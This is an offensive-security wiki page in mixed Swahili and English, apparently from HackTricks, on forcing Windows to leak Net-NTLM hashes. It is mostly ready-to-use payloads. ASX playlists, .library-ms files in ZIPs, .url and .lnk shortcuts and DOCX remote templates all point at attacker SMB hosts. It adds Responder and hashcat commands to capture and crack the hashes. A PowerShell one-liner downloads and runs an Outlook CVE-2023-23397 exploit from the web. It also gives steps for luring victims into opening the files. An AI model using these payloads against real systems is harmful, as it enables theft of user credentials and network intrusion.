# Maeneo ya kuiba NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Angalia mawazo yote mazuri kutoka [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) kutoka kwenye download ya microsoft word file mtandaoni hadi chanzo cha ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md na [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

Ikiwa unaweza kumfanya lengo kufungua au kuangalia awali Windows Media Player playlist unayodhibiti, unaweza leak Net‑NTLMv2 kwa kuelekeza entry kwa UNC path. WMP itajaribu kupata media iliyotajwa kupitia SMB na itauthenticate implicitly.

Mfano payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Mtiririko wa ukusanyaji na kuvunja:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### .library-ms iliyowekwa ndani ya ZIP NTLM leak (CVE-2025-24071/24055)

Windows Explorer inashughulikia kwa njia isiyo salama faili za .library-ms zinapofunguliwa moja kwa moja ndani ya archive ya ZIP. Ikiwa ufafanuzi wa library unaonyesha kwenye njia ya mbali ya UNC (mfano, \\attacker\share), kuvinjari au kuanzisha .library-ms ndani ya ZIP peke yake husababisha Explorer kuorodhesha UNC na kutuma uthibitishaji wa NTLM kwa attacker. Hii inatoa NetNTLMv2 ambayo inaweza cracked offline au potentially relayed.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Unda faili .library-ms kwa XML iliyotajwa hapo juu (weka IP/hostname yako).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and subiri waathiriwa kufungua .library-ms kutoka ndani ya ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows ilisindika property ya MAPI iliyopanuliwa PidLidReminderFileParameter katika vitu vya kalenda. Ikiwa property hiyo inaonyesha njia ya UNC (e.g., \\attacker\share\alert.wav), Outlook ingewasiliana na SMB share wakati ukumbusho unapoanzishwa, leaking Net‑NTLMv2 ya mtumiaji bila kubofya chochote. Hii ilirekebishwa tarehe 14 Machi 2023, lakini bado inabaki muhimu kwa fleets za legacy/zisizoguswa na kwa majibu ya matukio ya kihistoria.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Upande wa Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Maelezo
- Mwathirika anahitaji tu Outlook for Windows kuwa inakimbia wakati ukumbusho unapoanzishwa.
- Leak inatoa Net‑NTLMv2 inayofaa kwa offline cracking au relay (si pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer huonyesha ikoni za shortcut kiotomatiki. Utafiti wa hivi karibuni ulionyesha kwamba hata baada ya patch ya Microsoft ya Aprili 2025 kwa UNC‑icon shortcuts, ilikuwa bado inawezekana kusababisha uthibitisho wa NTLM bila kubofya kwa kuweka target ya shortcut kwenye UNC path na kuweka ikoni local (patch bypass ilipewa CVE‑2025‑50154). Kutazama tu folda kunasababisha Explorer kupata metadata kutoka kwa target ya mbali, na kutoa NTLM kwa SMB server ya mshambulizi.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload ya kiungo cha programu (.lnk) kupitia PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Mbinu za utoaji
- Weka shortcut ndani ya ZIP na umshawishi mwathiriwa kuvinjari.
- Weka shortcut kwenye share inayoweza kuandikwa ambayo mwathiriwa atafungua.
- Changanya na faili nyingine za kumshawishi kwenye folda moja ili Explorer ionyeshe mapitio ya vitu.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Nyaraka za Office zinaweza kurejelea kiolezo cha nje. Ikiwa utaweka kiolezo kilichounganishwa kwenye UNC path, kufungua nyaraka kutafanya uthibitishaji kwa SMB.

Minimal DOCX relationship changes (inside word/):

1) Hariri word/settings.xml na ongeza rejea ya kiolezo kilichounganishwa:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Hariri word/_rels/settings.xml.rels na elekeza rId1337 kwa UNC yako:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Pakia tena kama .docx na uwasilishe. Endesha SMB capture listener yako na subiri mpaka ifunguliwe.

Kwa mawazo ya baada ya capture juu ya relaying au kutumia vibaya NTLM, angalia:

{{#ref}}
README.md
{{#endref}}


## Marejeo
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
